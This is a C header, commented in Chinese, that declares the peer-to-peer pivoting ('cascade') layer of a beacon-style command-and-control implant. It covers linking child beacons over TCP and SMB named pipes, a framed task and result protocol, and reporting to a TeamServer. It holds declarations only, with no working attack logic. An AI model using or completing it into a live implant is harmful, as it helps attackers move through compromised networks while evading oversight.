#pragma once

#include "beacon_packet.h"

struct BeaconContext;

/* ===== 级联协议常量 ===== */

#define CASCADE_PROTOCOL_TCP 1u
#define CASCADE_PROTOCOL_SMB 2u

#define CASCADE_IO_NONE 0u
#define CASCADE_IO_TCP  1u
#define CASCADE_IO_PIPE 2u

#define CASCADE_FRAME_HELLO  1u
#define CASCADE_FRAME_TASK   2u
#define CASCADE_FRAME_RESULT 3u
#define CASCADE_FRAME_PING   4u
#define CASCADE_FRAME_CLOSE  5u

/* 单帧最大载荷（16 MB） */
#define CASCADE_MAX_FRAME_SIZE (16u * 1024u * 1024u)

/* ===== I/O 句柄 ===== */

/*
 * 级联通道的 I/O 抽象层。
 * TCP 使用 sock + WSAEVENT；Pipe 使用 pipe + HANDLE event。
 * 两种模式都支持 overlapped 读写。
 */
typedef struct CascadeIo {
    UINT32 kind;                /* CASCADE_IO_NONE / TCP / PIPE */
    SOCKET sock;                /* TCP socket，INVALID_SOCKET 表示未使用 */
    HANDLE pipe;                /* 命名管道句柄，INVALID_HANDLE_VALUE 表示未使用 */
    WSAEVENT event;             /* TCP: WSAEvent */
    HANDLE read_event;          /* Pipe: overlapped read 完成事件 */
    HANDLE write_event;         /* Pipe: overlapped write 完成事件 */
    CRITICAL_SECTION write_lock;/* 写入互斥锁，防止并发 WriteFile/send 交错 */
    LONG lock_initialized;      /* write_lock 是否已初始化 */
    OVERLAPPED read_olap;       /* 异步读 overlapped 结构 */
    OVERLAPPED write_olap;      /* 异步写 overlapped 结构 */
    BOOL read_pending;          /* 是否有未完成的异步读操作 */
    BYTE8 read_buf[8192];       /* 异步读持久缓冲区 */
} CascadeIo;

/* ===== 帧阅读器（增量解析状态机） ===== */

/*
 * 增量帧解析器，支持跨多次 recv/ReadFile 调用累积完整帧。
 * 线协议：[4B BE length][4B magic][2B version][2B cmd][4B body_len][body]
 * length = 12 + body_len。
 */
typedef struct CascadeFrameReader {
    UINT32 state;               /* 0=累积 header，1=累积 body */
    BYTE8  hdr_buf[16];         /* header 缓冲区（4B 长度 + 12B 固定头） */
    SIZE_T hdr_off;             /* 已累积的 header 字节数 */
    UINT32 body_len;            /* 解析出的 body 长度 */
    ByteBuf body;               /* body 内部累积缓冲区 */
    SIZE_T body_off;            /* 已累积的 body 字节数 */
} CascadeFrameReader;

/* ===== TCP 监听器 ===== */

/* TCP 服务端监听 socket + 事件，用于等待传入连接 */
typedef struct CascadeTcpListener {
    SOCKET listener;            /* 监听 socket */
    WSAEVENT event;             /* accept 就绪事件 */
} CascadeTcpListener;

/* ===== Pipe 监听器 ===== */

/* 命名管道服务端监听器，使用 overlapped ConnectNamedPipe 异步等待连接 */
typedef struct CascadePipeListener {
    HANDLE pipe;                /* 当前管道实例句柄 */
    HANDLE event;               /* 连接完成事件 */
    OVERLAPPED olap;            /* ConnectNamedPipe overlapped 结构 */
    BOOL pending_connect;       /* 是否有未完成的 ConnectNamedPipe */
} CascadePipeListener;

/* ===== 待处理队列 ===== */

/* 级联管理器的待处理数据包链表节点 */
typedef struct CascadePending {
    ByteBuf packet;             /* 数据包内容 */
    struct CascadePending* next;
} CascadePending;

/* ===== 级联通道 ===== */

/*
 * 单个级联子通道的状态。
 * 每个连接到父 beacon 的子 beacon 对应一个 CascadeChannel。
 */
typedef struct CascadeChannel {
    CHAR child_id[64];          /* 子 beacon 唯一标识 */
    UINT32 protocol;            /* CASCADE_PROTOCOL_TCP / SMB */
    CHAR hint[256];             /* 连接提示（地址或管道名） */
    CascadeIo io;               /* I/O 句柄 */
    HANDLE thread;              /* 保留，当前未使用 */
    volatile LONG active;       /* 通道是否活跃 */
    struct BeaconContext* ctx;   /* 所属 beacon 上下文 */
    struct CascadeChannel* next;/* 链表下一个节点 */
    CascadeFrameReader frame_reader; /* 帧阅读器 */
} CascadeChannel;

/* ===== 级联管理器 ===== */

/* 管理所有活跃级联通道和待处理数据包 */
typedef struct CascadeManager {
    CRITICAL_SECTION lock;      /* 通道列表和待处理队列的互斥锁 */
    struct BeaconContext* ctx;   /* 所属 beacon 上下文 */
    CascadeChannel* channels;   /* 活跃通道链表 */
    CascadePending* pending_head;/* 待处理队列头 */
    CascadePending* pending_tail;/* 待处理队列尾 */
    SIZE_T pending_count;        /* 待处理数据包数量 */
} CascadeManager;

/* ===== 级联管理器生命周期 ===== */

/* 初始化级联管理器 */
VOID CascadeInit(CascadeManager* cm, struct BeaconContext* ctx);

/* 释放级联管理器及所有通道 */
VOID CascadeFree(CascadeManager* cm);

/*
 * 同步关闭所有活跃子通道，并为每个通道入队 CASCADE_DEAD 通知。
 * 应在 beacon exit 命令处理时、设置 should_exit 之前调用，
 * 确保 Dead 包在当前 flush 周期内随 outbox 一同发往 TeamServer。
 */
VOID CascadeShutdownAll(CascadeManager* cm);

/* 轮询所有通道，返回待处理的数据包列表（调用方负责释放） */
PacketList CascadePoll(CascadeManager* cm);

/* ===== 命令处理函数 ===== */

/* 处理 connect_tcp 命令：建立到子 beacon 的 TCP 连接 */
ByteBuf CascadeHandleConnectTcp(struct BeaconContext* ctx, Parser* parser);

/* 处理 link_smb 命令：通过命名管道连接子 beacon */
ByteBuf CascadeHandleLinkSmb(struct BeaconContext* ctx, Parser* parser);

/* 处理 route 命令：向子通道转发任务数据 */
ByteBuf CascadeHandleRoute(struct BeaconContext* ctx, Parser* parser);

/* 处理 close 命令：关闭指定子通道 */
ByteBuf CascadeHandleClose(struct BeaconContext* ctx, Parser* parser);

/* ===== CascadeIo 操作 ===== */

/* 初始化 CascadeIo 结构体 */
VOID CascadeIoInit(CascadeIo* io);

/* 关闭 I/O 句柄，取消未完成的 overlapped 操作，释放事件 */
VOID CascadeIoClose(CascadeIo* io);

/* 读取一帧（阻塞式），用于 HELLO 握手 */
BOOL CascadeIoReadFrame(CascadeIo* io, UINT16* cmd, ByteBuf* body);

/* 写入一帧（阻塞式，带写锁） */
BOOL CascadeIoWriteFrame(CascadeIo* io, UINT16 cmd, const ByteBuf* body);

/* 为 TCP socket 启用 FD_READ|FD_CLOSE 事件通知（设为非阻塞） */
BOOL CascadeIoEnableTcpReadEvent(CascadeIo* io);

/* 消费 TCP 网络事件（WSAEnumNetworkEvents），返回事件掩码 */
BOOL CascadeIoConsumeTcpEvent(CascadeIo* io, LONG* events);

/* 重新启用 TCP 读事件（WSAEventSelect 重新注册） */
BOOL CascadeIoRearmTcpReadEvent(CascadeIo* io);

/* 返回 I/O 事件句柄，用于 WaitForSingleObject/BeaconWait */
HANDLE CascadeIoEvent(CascadeIo* io);

/* ===== 帧阅读器操作 ===== */

/* 初始化帧阅读器 */
VOID CascadeFrameReaderInit(CascadeFrameReader* reader);

/* 释放帧阅读器内部缓冲区 */
VOID CascadeFrameReaderFree(CascadeFrameReader* reader);

/*
 * 增量喂入数据，解析帧。
 * 返回：>0 已消费字节数（*cmd 非零表示帧完整），0 需更多数据，-1 错误。
 * 帧未完整时 *cmd 保持为 0，body 数据累积在内部缓冲区。
 */
INT  CascadeFrameReaderFeed(CascadeFrameReader* reader, const BYTE8* data, SIZE_T len,
                            UINT16* cmd, ByteBuf* body);

/* ===== TCP 连接与监听 ===== */

/* 主动连接到指定 TCP 地址（阻塞式，带超时） */
BOOL CascadeIoConnectTcp(const CHAR* host, INT port, INT timeout_ms, CascadeIo* out);

/* 在指定地址接受一个 TCP 连接（阻塞式） */
BOOL CascadeIoAcceptTcp(const CHAR* bind_host, INT bind_port, CascadeIo* out);

/* 初始化 TCP 监听器 */
VOID CascadeTcpListenerInit(CascadeTcpListener* listener);

/* 关闭 TCP 监听器 */
VOID CascadeTcpListenerClose(CascadeTcpListener* listener);

/* 返回监听器的事件句柄 */
HANDLE CascadeTcpListenerEvent(CascadeTcpListener* listener);

/* 开始在指定地址监听 TCP 连接 */
BOOL CascadeTcpListen(const CHAR* bind_host, INT bind_port, CascadeTcpListener* out);

/* 检查是否有就绪的 TCP 连接可接受 */
BOOL CascadeTcpAcceptReady(CascadeTcpListener* listener, CascadeIo* out);

/* ===== Pipe 连接与监听 ===== */

/* 连接到命名管道（客户端侧，阻塞式） */
BOOL CascadeIoConnectPipe(const CHAR* pipe_path, INT timeout_ms, CascadeIo* out);

/* 接受一个命名管道连接（阻塞式） */
BOOL CascadeIoAcceptPipe(const CHAR* pipe_name, CascadeIo* out);

/* 初始化 Pipe 监听器 */
VOID CascadePipeListenerInit(CascadePipeListener* listener);

/* 关闭 Pipe 监听器 */
VOID CascadePipeListenerClose(CascadePipeListener* listener);

/* 返回 Pipe 监听器的事件句柄 */
HANDLE CascadePipeListenerEvent(CascadePipeListener* listener);

/* 创建命名管道并开始异步等待连接（overlapped ConnectNamedPipe） */
BOOL CascadePipeListen(const CHAR* pipe_name, CascadePipeListener* out);

/* 检查是否有就绪的管道连接可接受 */
BOOL CascadePipeAcceptReady(CascadePipeListener* listener, CascadeIo* out);

/* 为管道 I/O 启用 overlapped 读事件 */
BOOL CascadeIoEnablePipeReadEvent(CascadeIo* io);
